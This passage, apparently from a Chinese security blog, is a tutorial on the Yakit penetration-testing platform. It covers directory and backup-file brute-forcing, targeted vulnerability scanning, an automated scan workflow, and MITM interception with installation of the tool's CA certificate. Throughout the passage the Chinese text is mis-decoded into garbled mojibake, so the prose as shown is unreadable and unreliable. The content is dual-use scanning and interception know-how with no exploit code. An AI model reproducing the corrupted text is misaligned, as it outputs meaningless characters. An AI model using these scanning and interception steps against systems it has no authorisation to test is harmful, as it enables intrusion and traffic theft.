‡åï¼Œç‚¹å‡»<code>å¼€å§‹æ‰§è¡Œ</code>å³å¯é’ˆå¯¹æ–‡ä»¶ä»¥åŠç½‘ç«™ç›®å½•è¿›è¡Œæ‰«æçˆ†ç ´ã€‚</p><p>æ”¯æŒçš„æ–‡ä»¶æˆ–æ–‡ä»¶ç±»å‹æœ‰ï¼š.sqlã€.bakã€.zipã€.rarã€admin.sqlã€backup.zipã€web.rarï¼Œå•æ¬¡æ‰«æç»“æœå¯åœ¨é¡µé¢ä¸‹æ–¹è¿›è¡Œå±•ç¤ºã€‚</p><h2 id="8-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#8-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="8.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>8.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><p>åç»­æ­å»ºé¶åœºè¿›è¡Œæµ‹è¯•ã€‚</p><h1 id="ä¹ã€ä¸“é¡¹æ¼æ´æµ‹è¯•"><a href="#ä¹ã€ä¸“é¡¹æ¼æ´æµ‹è¯•" class="headerlink" title="ä¹ã€ä¸“é¡¹æ¼æ´æµ‹è¯•"></a>ä¹ã€ä¸“é¡¹æ¼æ´æµ‹è¯•</h1><h2 id="9-1-èƒŒæ™¯"><a href="#9-1-èƒŒæ™¯" class="headerlink" title="9.1 èƒŒæ™¯"></a>9.1 èƒŒæ™¯</h2><p>ä¸“é¡¹æ¼æ´æ£€æµ‹æ˜¯é’ˆå¯¹ç‰¹å®šåº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿè¿›è¡Œçš„å®‰å…¨æ¼æ´æ‰«ææŠ€æœ¯ï¼Œæ—¨åœ¨æ£€æµ‹ä¸è¯¥åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿç›¸å…³çš„å®‰å…¨æ¼æ´ã€‚</p><p>Yakité€šè¿‡å¯¹å¸¸è§çš„ä¸­é—´ä»¶ã€CMSã€æ¡†æ¶ã€ç»„ä»¶è¿›è¡Œæ€»ç»“ã€å½’çº³ï¼Œå¹¶é’ˆå¯¹è¿™äº›ç»„ä»¶å¯¹å…¶å¸¸è§çš„é«˜å±æ¼æ´è¿›è¡Œäº†æ•´ç†ã€‚</p><p>é€šè¿‡é¢„åˆ¶æ¼æ´æºç ï¼Œå¯¹å¯ä»¥å¯¹æŸç±»ç‰¹å®šç›®æ ‡è¿›è¡Œä¸“é¡¹çš„æ¼æ´æ£€æµ‹ï¼Œå¯ä»¥è‡ªå®šä¹‰æ–°å¢pocç§ç±»ã€‚</p><h2 id="9-2-ä½¿ç”¨æ–¹æ³•"><a href="#9-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="9.2 ä½¿ç”¨æ–¹æ³•"></a>9.2 ä½¿ç”¨æ–¹æ³•</h2><p>é¦–å…ˆç‚¹å‡»å·¦ä¸Šè§’çš„ä¸‹æ‹‰èœå•ï¼Œé€‰æ‹©è‡ªå·±æƒ³è¦æ£€æµ‹çš„ç»„ä»¶ï¼Œé€‰æ‹©å®Œæˆååœ¨å³ä¾§æ–‡æœ¬æ¡†ä¸­è¾“å…¥æƒ³è¦æ£€æµ‹çš„ç›®æ ‡ç‚¹å‡»æ‰§è¡Œä»»åŠ¡å³å¯å¼€å§‹æ‰«æã€‚</p><p>å•æ¬¡æ‰«æçš„ç»“æœå¯ä»¥åœ¨<code>å‘½ä¸­é£é™©ä¸æ¼æ´</code>ä¸­æŸ¥çœ‹ã€‚</p><p>è‹¥è¦è¿›è¡Œæ‰¹é‡çš„æ£€æµ‹ï¼Œç‚¹å‡»<code>é¢å¤–é…ç½®</code>ç„¶å<code>ç‚¹å‡»æ­¤å¤„</code>ä¸Šä¼ æ–‡æœ¬æ–‡ä»¶</p><h2 id="9-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰"><a href="#9-3-å®éªŒéªŒè¯ï¼ˆEXï¼‰" class="headerlink" title="9.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰"></a>9.3 å®éªŒéªŒè¯ï¼ˆEXï¼‰</h2><p>åç»­ç ”ç©¶å…·ä½“æ¼æ´æ—¶è¿›è¡Œç›¸åº”çš„å®éªŒéªŒè¯ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.25.02.png" style="zoom:50%;"><h1 id="åã€è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹"><a href="#åã€è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹" class="headerlink" title="åã€è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹"></a>åã€è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹</h1><h2 id="10-1-èƒŒæ™¯"><a href="#10-1-èƒŒæ™¯" class="headerlink" title="10.1 èƒŒæ™¯"></a>10.1 èƒŒæ™¯</h2><p>æ¸—é€æµ‹è¯•æ˜¯ä¸€ç§é€šè¿‡æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»çš„æ–¹å¼ï¼Œé€šå¸¸æƒ…å†µä¸‹ä¸€èˆ¬ä¼šåŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ul><li>ä¿¡æ¯æ”¶é›†ï¼šé€šè¿‡æœç´¢å¼•æ“ã€whoisæŸ¥è¯¢ã€å­åŸŸåæšä¸¾ã€ç½‘ç»œæ‹“æ‰‘åˆ†æç­‰æ–¹å¼ï¼Œæ”¶é›†ç›®æ ‡ç³»ç»Ÿçš„åŸºç¡€ä¿¡æ¯ï¼Œå¦‚IPåœ°å€ã€åŸŸåã€ä¸»æœºåã€æ“ä½œç³»ç»Ÿã€æœåŠ¡ç­‰ã€‚</li><li>ç«¯å£æ‰«æï¼šä½¿ç”¨ç«¯å£æ‰«æå·¥å…·ï¼Œæ‰«æç›®æ ‡ç³»ç»Ÿçš„å¼€æ”¾ç«¯å£ï¼Œç¡®å®šå“ªäº›ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œä»¥åŠå“ªäº›æœåŠ¡è¿è¡Œåœ¨è¿™äº›ç«¯å£ä¸Šã€‚</li><li>æ¼æ´æ¢æµ‹ï¼šä½¿ç”¨æ¼æ´æ‰«æå·¥å…·ï¼Œå¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæ¼æ´æ‰«æï¼Œæ¢æµ‹ç›®æ ‡ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å·²çŸ¥æ¼æ´æˆ–å¼±ç‚¹ã€‚</li><li>æ¼æ´éªŒè¯ï¼šå¯¹æ‰«æå·¥å…·å‘ç°çš„æ¼æ´è¿›è¡ŒéªŒè¯ï¼Œç¡®è®¤æ¼æ´æ˜¯å¦çœŸå®å­˜åœ¨ã€æ˜¯å¦å¯åˆ©ç”¨ï¼Œä»¥åŠæ¼æ´å¯¹ç³»ç»Ÿçš„å½±å“ç¨‹åº¦ã€‚</li></ul><p>åœ¨å…·ä½“å®è·µä¸­ï¼Œä¿¡æ¯æ”¶é›†å’Œç«¯å£æ‰«æé€šå¸¸æ˜¯æ¼æ´æ£€æµ‹çš„ç¬¬ä¸€æ­¥ï¼Œä»¥ä¾¿å¯¹ç›®æ ‡ç³»ç»Ÿçš„ç»“æ„å’Œç»„ä»¶æœ‰ä¸€ä¸ªå¤§ä½“çš„äº†è§£ã€‚æ¥ä¸‹æ¥ï¼Œæ¼æ´æ¢æµ‹å’Œæ¼æ´éªŒè¯åˆ™æ˜¯ç¡®å®šç›®æ ‡ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å®‰å…¨æ¼æ´çš„å…³é”®æ­¥éª¤ã€‚</p><p>æ¼æ´æ£€æµ‹æ˜¯ä¸€é¡¹å¤æ‚çš„ä»»åŠ¡ï¼Œéœ€è¦æ ¹æ®ç›®æ ‡ç³»ç»Ÿçš„ç‰¹ç‚¹å’Œå®‰å…¨éœ€æ±‚ï¼Œç»¼åˆé€‰æ‹©é€‚å½“çš„å·¥å…·å’ŒæŠ€æœ¯è¿›è¡Œæµ‹è¯•ï¼Œä»¥å°½å¯èƒ½å…¨é¢åœ°å‘ç°ç³»ç»Ÿä¸­å­˜åœ¨çš„å®‰å…¨æ¼æ´å’Œé£é™©ã€‚</p><p>Yakitä¸­çš„åŸºç¡€å·¥å…·ï¼Œæ¶µç›–äº†æ¸—é€æµ‹è¯•çš„å…¨æµç¨‹ï¼Œæœ¬ç« èŠ‚æ˜¯å¯¹Yakitè‡ªåŠ¨åŒ–æ¸—é€çš„æ¢ç´¢ï¼Œæ—¨åœ¨è‡ªåŠ¨åŒ–å®Œæˆä»ä¿¡æ¯æ”¶é›†ã€ç«¯å£æ‰«æã€æ¼æ´æ¢æµ‹ã€æ¼æ´éªŒè¯çš„å…¨è¿‡ç¨‹ã€‚æ¯”å¦‚ä¸»æœºæœåŠ¡æ£€æµ‹ã€WEBæœåŠ¡æ£€æµ‹ã€æ¼æ´æ£€æµ‹ã€å¼±å£ä»¤æ£€æµ‹ç­‰åœºæ™¯çš„ç»„åˆåˆ©ç”¨ã€‚</p><p>ä¸‹é¢ä»¥ä¿¡æ¯æ”¶é›†ã€ç«¯å£æ‰«æã€æ¼æ´æ¢æµ‹ã€æ¼æ´éªŒè¯çš„å…¨è¿‡ç¨‹ä¸ºä¾‹ï¼Œè¿›è¡Œä½¿ç”¨çš„è¯´æ˜ã€‚</p><h2 id="10-2-ä½¿ç”¨æ–¹æ³•"><a href="#10-2-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="10.2 ä½¿ç”¨æ–¹æ³•"></a>10.2 ä½¿ç”¨æ–¹æ³•</h2><p>é¦–å…ˆï¼Œæ‰“å¼€<code>åŸºç¡€å·¥å…·</code>â€“<code>ç«¯å£/æŒ‡çº¹æ‰«æ</code> åœ¨å·¦ä¾§çš„æ’ä»¶å¤„å‹¾é€‰å„ä¸ªè¿‡ç¨‹æ‰€éœ€è¦çš„æ’ä»¶ï¼Œç„¶ååœ¨æ–‡æœ¬æ¡†è¾“å…¥æƒ³è¦æ‰«æçš„ç›®æ ‡ï¼Œ</p><p>åœ¨å„ä¸ªæ’ä»¶çš„å‚æ•°é…åˆ¶å¤„æ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œè°ƒæ•´ï¼Œç„¶åç‚¹å‡»æ‰§è¡Œä»»åŠ¡è¿›å¼€å§‹æ‰«æã€‚</p><p>æ¯ä¸ªæ’ä»¶æ‰«æçš„ç»“æœä¼šåœ¨å¯¹åº”çš„ä¸‹æ–¹çš„å±•ç¤ºæ å¤„è¿›è¡Œå±•ç¤ºï¼Œå¯æ ¹æ®éœ€æ±‚è¿›è¡ŒæŸ¥çœ‹ã€‚</p><p>é’ˆå¯¹æ‰«æIPæ•°é‡å¤šå°‘å¯ä»¥åšä¸€äº›æ›´å¤šå‚æ•°é«˜çº§é…ç½®ã€‚</p><ul><li>æ‰«ææ¨¡å¼é€‰æ‹©</li></ul><p>æœåŠ¡å™¨IPæ•°é‡å°‘ï¼Œæˆ‘ä»¬å°±é€‰æ‹©æŒ‡çº¹æ‰«æï¼Œè¿™ä¸ªç›¸å¯¹æ¥è¯´è¦å‡†ç¡®ä¸€ç‚¹ï¼Œä½†æ˜¯é€Ÿåº¦è¦æ…¢ä¸€ç‚¹ï¼ŒæœåŠ¡å™¨IPæ•°æ®é‡å¤šï¼Œæˆ‘ä»¬å°±é€‰æ‹©SYNæ‰«æ æˆ–è€… SYN+æŒ‡çº¹æ‰«æï¼Œé€Ÿåº¦è¾ƒå¿«ã€‚</p><p>ä¸»åŠ¨å‘åŒ…è¶…æ—¶æ—¶é—´è®¾ç½®ï¼šå¦‚æœå·¦ä¾§é€‰æ‹©çš„æ’ä»¶å°‘ æˆ‘ä»¬å°±è®¾ç½®5-7 å¦‚æœå·¦ä¾§é€‰æ‹©çš„æ’ä»¶å¤š æˆ‘ä»¬å°±è®¾ç½®1-3</p><p>å…¶ä»–é…ç½®ï¼šæ ¹æ®è¯¦æƒ…å®é™…æƒ…å†µè€Œå®šï¼Œä¸€èˆ¬é»˜è®¤æ— éœ€ä¿®æ”¹ã€‚</p><ul><li>æ’ä»¶æ‰¹é‡æ‰§è¡Œæ¨¡å—</li></ul><p>è¯¥æ¨¡å—æ—¨åœ¨è‡ªåŠ¨åŒ–å¯¹URLè¿›è¡Œæ‰«æè¯†åˆ«å³æ¼æ´æ£€æµ‹ã€‚ç‚¹å‡»<code>æ’ä»¶</code>-é€‰æ‹©<code>æ’ä»¶æ‰¹é‡æ‰§è¡Œ</code>â€“<code>è¾“å…¥ç›®æ ‡</code>â€“<code>æ‰§è¡Œä»»åŠ¡</code>å³å¯ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.30.43.png" style="zoom:50%;"><p>æ³¨æ„é¢å¤–é…ç½®æ‰«æè¶…æ—¶ é»˜è®¤è®¾ç½®2å°æ—¶ 7200 å¯ä»¥æ ¹æ®æ‰«æç½‘ç«™æ•°é‡è€Œå®šè®¾ç½®3600éƒ½å¯ä»¥ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®ä»£ç†ç­‰æ“ä½œã€‚</p><p>æ‰«æåˆ°ä¸€åŠç‚¹å‡»â€œç»“æŸâ€ï¼Œè¿›è¡Œä¸­æ–­çš„ä»»åŠ¡ï¼Œå¯åœ¨æœªå®Œæˆä¸­é€‰æ‹©ä»»åŠ¡ç»§ç»­æ‰§è¡Œã€‚</p><h1 id="åä¸€ã€MITMä¸­é—´äººä»£ç†ä¸åŠ«æŒ"><a href="#åä¸€ã€MITMä¸­é—´äººä»£ç†ä¸åŠ«æŒ" class="headerlink" title="åä¸€ã€MITMä¸­é—´äººä»£ç†ä¸åŠ«æŒ"></a>åä¸€ã€MITMä¸­é—´äººä»£ç†ä¸åŠ«æŒ</h1><h2 id="11-1-ä¸­é—´äººæ”»å‡»ç®€ä»‹"><a href="#11-1-ä¸­é—´äººæ”»å‡»ç®€ä»‹" class="headerlink" title="11.1 ä¸­é—´äººæ”»å‡»ç®€ä»‹"></a>11.1 ä¸­é—´äººæ”»å‡»ç®€ä»‹</h2><p>â€œMITMâ€ æ˜¯ â€œMan-in-the-Middleâ€ çš„ç¼©å†™ï¼Œæ„æ€æ˜¯ä¸­é—´äººæ”»å‡»ã€‚</p><p>MITMæ”»å‡»æ˜¯ä¸€ç§ç½‘ç»œæ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡æ¬ºéª—çš„æ‰‹æ®µï¼Œè®©è‡ªå·±æˆä¸ºé€šä¿¡åŒæ–¹ä¹‹é—´çš„ä¸­é—´äººï¼Œä»è€Œå¯ä»¥çªƒå–åŒæ–¹ä¹‹é—´çš„é€šä¿¡å†…å®¹ã€ä¿®æ”¹é€šä¿¡å†…å®¹ã€ç”šè‡³ç¯¡æ”¹é€šä¿¡æµé‡ï¼Œä»è€Œå®ç°çªƒå–ä¿¡æ¯ã€ä¼ªé€ ä¿¡æ¯ç­‰æ”»å‡»ç›®çš„ã€‚</p><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒMITMåŠ«æŒå¯ä»¥è¢«ç”¨æ¥æ¨¡æ‹ŸçœŸå®çš„é»‘å®¢æ”»å‡»ï¼Œä»¥æµ‹è¯•ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚</p><p>æ¸—é€æµ‹è¯•ä¸­ä½¿ç”¨MITMæ”»å‡»çš„ä¸€ä¸ªå…¸å‹åœºæ™¯æ˜¯åœ¨æµ‹è¯•Webåº”ç”¨ç¨‹åºæ—¶ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨MITMæŠ€æœ¯æ‹¦æˆªåº”ç”¨ç¨‹åºå’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ï¼Œä»¥è·å–ç”¨æˆ·åå’Œå¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…ç¯¡æ”¹åº”ç”¨ç¨‹åºè¿”å›çš„æ•°æ®ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»£ç†å·¥å…·ï¼Œæ¥æ•è·åº”ç”¨ç¨‹åºå‘é€å’Œæ¥æ”¶çš„æ•°æ®ï¼Œå¯¹æ•°æ®è¿›è¡Œä¿®æ”¹æˆ–ç¯¡æ”¹ï¼Œç„¶åé‡æ–°å‘é€åˆ°åº”ç”¨ç¨‹åºæˆ–æœåŠ¡å™¨ã€‚è¿™æ ·å°±å¯ä»¥æµ‹è¯•åº”ç”¨ç¨‹åºæ˜¯å¦å¯ä»¥æœ‰æ•ˆåœ°é˜²èŒƒMITMæ”»å‡»ï¼Œå¹¶ä¸”æ˜¯å¦èƒ½å¤Ÿæ­£ç¡®åœ°å¤„ç†åº”ç”¨ç¨‹åºå’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚</p><p>MITMæ”»å‡»è¿˜å¯ä»¥ç”¨æ¥æµ‹è¯•ç½‘ç»œçš„å¼±ç‚¹ï¼Œå¹¶æ£€æµ‹æ˜¯å¦å­˜åœ¨æ½œåœ¨çš„æ¼æ´ã€‚é€šè¿‡MITMæ”»å‡»ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥æ•è·ç½‘ç»œä¸­ä¼ è¾“çš„æ•°æ®ï¼Œå¹¶è¿›è¡Œåˆ†æå’Œå®¡æŸ¥ï¼Œä»¥å‘ç°å¯èƒ½å­˜åœ¨çš„å®‰å…¨é—®é¢˜ã€‚</p><p>ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨MITMæ”»å‡»æ¥æ¬ºéª—å±€åŸŸç½‘å†…çš„è®¾å¤‡ï¼Œå¹¶æ‹¦æˆªè®¾å¤‡ä¹‹é—´çš„é€šä¿¡æµé‡ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼Œæˆ–è€…ç¯¡æ”¹æ•°æ®åŒ…ï¼Œå¯¹ç½‘ç»œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚</p><p>æ€»çš„æ¥è¯´ï¼ŒMITMåŠ«æŒæ˜¯æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå®ƒå¯ä»¥å¸®åŠ©æµ‹è¯•äººå‘˜å‘ç°ç½‘ç»œä¸­å¯èƒ½å­˜åœ¨çš„å®‰å…¨æ¼æ´ï¼Œæä¾›ç›¸åº”çš„å»ºè®®å’Œè§£å†³æ–¹æ¡ˆï¼Œä»è€Œä¿æŠ¤ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚</p><h2 id="11-2-MITM-äº¤äº’å¼åŠ«æŒæŠ€æœ¯"><a href="#11-2-MITM-äº¤äº’å¼åŠ«æŒæŠ€æœ¯" class="headerlink" title="11.2 MITM äº¤äº’å¼åŠ«æŒæŠ€æœ¯"></a>11.2 MITM äº¤äº’å¼åŠ«æŒæŠ€æœ¯</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2010.55.27.png" alt="YakMITMåŠ«æŒåŸç†ç¤ºæ„å›¾" style="zoom:50%;"><p>Yakitçš„MITMæ¨¡å—åŸç†æ˜¯å¯åŠ¨ä¸€ä¸ªHTTPä»£ç†ï¼Œè‡ªåŠ¨è½¬å‘æµé‡ï¼Œå½“ç”¨æˆ·å¯åŠ¨æ‰‹åŠ¨åŠ«æŒåï¼Œä¼šåœæ­¢è‡ªåŠ¨è½¬å‘ï¼Œé˜»å¡è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚å‡ºæ ˆï¼Œåšè§£å‹Gzipã€å¤„ç†chunkã€è§£ç ç­‰å¤„ç†ï¼Œè®©è¯·æ±‚å˜å¾—äººç±»å¯è¯»ï¼Œå¹¶æ˜¾ç¤ºåœ¨ç”¨æˆ·å‰ç«¯ï¼Œç”¨æˆ·å¯ä»¥å¯¹è¯·æ±‚åšæŸ¥çœ‹ã€ä¿®æ”¹æˆ–é‡æ”¾ã€‚</p><p>é‡æ”¾æ—¶ï¼Œä¼šå¯¹ç”¨æˆ·æ„é€ çš„HTTPè¯·æ±‚æ•°æ®åŒ…åšä¿®å¤ï¼Œä¿è¯è¯·æ±‚åŒ…çš„æœ‰æ•ˆæ€§ã€‚Yakå¼•æ“æ‰‹åŠ¨å®ç°äº†HTTPåº“ï¼Œæ‰€ä»¥ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰ç•¸å½¢çš„è¯·æ±‚åŒ…ã€å“åº”åŒ…ï¼Œåº”ç”¨äºä¸€äº›ç‰¹æ®Šåœºæ™¯ä¸‹çš„æ¼æ´åˆ©ç”¨ã€‚</p><p>MITMæ“ä½œå°å¯ç™¾åˆ†ç™¾æ›¿ä»£ BurpSuiteï¼Œä¸‹è½½å¹¶å®‰è£…è¯ä¹¦ã€åŠ«æŒè¯·æ±‚ã€å“åº”ã€ç¼–è¾‘åŠ«æŒåˆ°çš„æ•°æ®åŒ…ç­‰ã€‚</p><p>å¹¶ä¸”æä¾›ä¸€æ•´å¥—é¡ºç•…çš„å·¥ä½œæµï¼ŒåŠ«æŒ =&gt; History =&gt; Repeater / Intruderï¼ŒåŠ«æŒåˆ°çš„æ•°æ®ï¼Œåœ¨Historyå¯ä»¥æŸ¥çœ‹å†å²æ•°æ®ï¼Œé€‰æ‹©éœ€è¦â€œæŒ–æ˜â€çš„æ•°æ®åŒ…ï¼Œå‘é€åˆ° WebFuzzer è¿›è¡Œ Repeater / Intruder æ“ä½œã€‚</p><p>é™¤äº†è¿™äº›å…¸å‹çš„æ“ä½œåœºæ™¯å¤–ï¼ŒMITM è¿˜æä¾›äº†æ’ä»¶è¢«åŠ¨æ‰«æã€çƒ­åŠ è½½ã€æ•°æ®åŒ…æ›¿æ¢ã€æ ‡è®°ç­‰æ›´çµæ´»çš„åŠŸèƒ½ã€‚</p><h2 id="11-3-å…é…ç½®æ¨¡å¼"><a href="#11-3-å…é…ç½®æ¨¡å¼" class="headerlink" title="11.3 å…é…ç½®æ¨¡å¼"></a>11.3 å…é…ç½®æ¨¡å¼</h2><p>ä½¿ç”¨å…é…ç½®æ¨¡å¼ã€‚ä¸éœ€è¦ä»»ä½•å…¶ä»–é…ç½®ï¼Œåªéœ€å®‰è£…Chrome æµè§ˆå™¨ï¼Œå…é…ç½®å¯åŠ¨ä¹‹åå°†æ‰“å¼€ä¸€ä¸ªæ–°çš„æµè§ˆå™¨ä¼šè¯ï¼Œå…¶ä¸­æ‰€æœ‰æµé‡éƒ½å°†é€šè¿‡ Yakit è‡ªåŠ¨ä»£ç†ã€‚æ— éœ€å®‰è£… Yakit çš„ CA è¯ä¹¦å°±å¯ä»¥ä½¿ç”¨å®ƒæ¥é€šè¿‡ HTTPS è¿›è¡Œæµ‹è¯•ã€‚</p><p>ç‚¹å‡»<code>æ¸—é€æµ‹è¯•</code>â€“<code>MITMäº¤äº’å¼åŠ«æŒ</code>å³å¯è¿›å…¥MITMåŠ«æŒé¡µé¢ï¼Œç‚¹å‡»<code>å…é…ç½®å¯åŠ¨</code>è¿›å…¥å…é…ç½®å¯åŠ¨è®¾ç½®ç•Œé¢ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.04.49.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2011.09.40.png" style="zoom:50%;"><p>é…ç½®ä»£ç†å¤„é»˜è®¤ä¸ºï¼š<a href="http://127.0.0.1:8083/">http://127.0.0.1:8083</a> é»˜è®¤é…ç½®ä»£ç†æ— éœ€ä¿®æ”¹ï¼Œç‚¹å‡»<code>å¯åŠ¨å…é…ç½®Chrome</code> é»˜è®¤å¯åŠ¨è°·æ­Œæµè§ˆå™¨ï¼Œå³å¼€å§‹åŠ«æŒæŠ“åŒ…ï¼Œç‚¹å‡»å›¾ä¸­â‘£çš„<code>å…é…ç½®å¯åŠ¨</code>å³å¯å…³é—­ä»£ç†ã€‚</p><h2 id="11-4-å®‰è£…è¯ä¹¦å¯åŠ¨MITMåŠ«æŒ"><a href="#11-4-å®‰è£…è¯ä¹¦å¯åŠ¨MITMåŠ«æŒ" class="headerlink" title="11.4 å®‰è£…è¯ä¹¦å¯åŠ¨MITMåŠ«æŒ"></a>11.4 å®‰è£…è¯ä¹¦å¯åŠ¨MITMåŠ«æŒ</h2><p>ä½¿ç”¨ã€é€‰æ‹©çš„å¤–éƒ¨æµè§ˆå™¨ã€‚ç”±äºå„ç§åŸå› ï¼Œå¯èƒ½ä¸æƒ³ä½¿ç”¨å…é…ç½®çš„ä»£ç†çš„æµè§ˆå™¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦æ‰§è¡Œä¸€äº›å…¶ä»–æ­¥éª¤æ¥é…ç½®æµè§ˆå™¨ä»¥ä¸ Yakitçš„ MITM ä¸€èµ·ä½¿ç”¨ï¼Œå¹¶åœ¨æµè§ˆå™¨ä¸­å®‰è£… Yakit çš„ CA è¯ä¹¦ã€‚</p><p>HTTPSåè®®æ˜¯ä¸€ç§å®‰å…¨çš„HTTPåè®®ï¼Œé€šè¿‡SSL/TLSåè®®æ¥å®ç°é€šä¿¡çš„åŠ å¯†å’Œèº«ä»½éªŒè¯ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢MITMæ”»å‡»ã€‚</p><p>ç„¶è€Œï¼Œè™½ç„¶HTTPSåè®®å¯ä»¥ä¿è¯é€šä¿¡çš„å®‰å…¨æ€§ï¼Œä½†åœ¨ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ç­‰ä¸­é—´è®¾å¤‡æ—¶ï¼Œä¹Ÿä¼šå­˜åœ¨MITMæ”»å‡»çš„é£é™©ã€‚</p><p>è¿™æ˜¯å› ä¸ºä»£ç†æœåŠ¡å™¨éœ€è¦å¯¹HTTPSè¿æ¥è¿›è¡Œè§£å¯†å’Œå†åŠ å¯†ï¼Œä»è€Œä¸­æ–­åŸæœ¬çš„ç«¯åˆ°ç«¯åŠ å¯†ï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½åˆ©ç”¨è¿™ä¸ªä¸­æ–­ç‚¹è¿›è¡ŒMITMæ”»å‡»ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒHTTPSåè®®ä¸­å¼•å…¥äº†ä¸€ç§ç§°ä¸ºè¯ä¹¦é”å®šï¼ˆCertificate Pinningï¼‰çš„æœºåˆ¶ã€‚é€šè¿‡è¯ä¹¦é”å®šï¼Œå®¢æˆ·ç«¯å¯ä»¥é¢„å…ˆä¿å­˜ç›®æ ‡æœåŠ¡å™¨çš„SSLè¯ä¹¦ä¿¡æ¯ï¼Œå¹¶åœ¨ä¸æœåŠ¡å™¨é€šä¿¡æ—¶ï¼Œæ£€æŸ¥æœåŠ¡å™¨è¿”å›çš„è¯ä¹¦æ˜¯å¦ä¸é¢„æœŸä¸€è‡´ï¼Œä»è€Œé¿å…ä»£ç†æœåŠ¡å™¨è¿›è¡Œæ¶æ„çš„è¯ä¹¦ç¯¡æ”¹å’Œä¸­é—´äººæ”»å‡»ã€‚</p><p>å› æ­¤ï¼Œä¸ºäº†å®ç°ä¸­é—´äººçš„è§’è‰²ï¼Œä»£ç†æœåŠ¡å™¨éœ€è¦è‡ªå·±ç”Ÿæˆä¸€ä¸ªSSLè¯ä¹¦ï¼Œå¹¶å°†å…¶å®‰è£…åœ¨å®¢æˆ·ç«¯ä¸Šï¼Œè®©å®¢æˆ·ç«¯ç›¸ä¿¡è¿™ä¸ªè¯ä¹¦æ˜¯æœ‰æ•ˆçš„ã€‚</p><p>è¿™ä¸ªè¯ä¹¦éœ€è¦è¢«å®¢æˆ·ç«¯æ‰€ä¿¡ä»»ï¼Œå¦åˆ™å®¢æˆ·ç«¯ä¼šå‡ºç°è­¦å‘Šæç¤ºï¼Œè¿™å°±éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸Šå®‰è£…ä»£ç†æœåŠ¡å™¨ç”Ÿæˆçš„è¯ä¹¦å¹¶è¿›è¡Œä¿¡ä»»è®¾ç½®ã€‚</p><p>å› æ­¤åŸºäºHTTPSåè®®è¿™äº›ç‰¹æ€§ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ä»£ç†æ—¶ï¼Œéœ€è¦å®‰è£…Yakit CA è¯ä¹¦ï¼Œæ‰èƒ½æ‹¦æˆªHTTPSçš„æ¶ˆæ¯ã€‚</p><h3 id="11-4-1-CAè¯ä¹¦çš„å®‰è£…"><a href="#11-4-1-CAè¯ä¹¦çš„å®‰è£…" class="headerlink" title="11.4.1 CAè¯ä¹¦çš„å®‰è£…"></a>11.4.1 CAè¯ä¹¦çš„å®‰è£…</h3><p>å…³äºè¯ä¹¦çš„å®‰è£…(ä»¥windowsä¸ºä¾‹)ï¼Œä¸»è¦æœ‰ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><p>é¦–å…ˆï¼Œéœ€è¦æˆ‘ä»¬æ 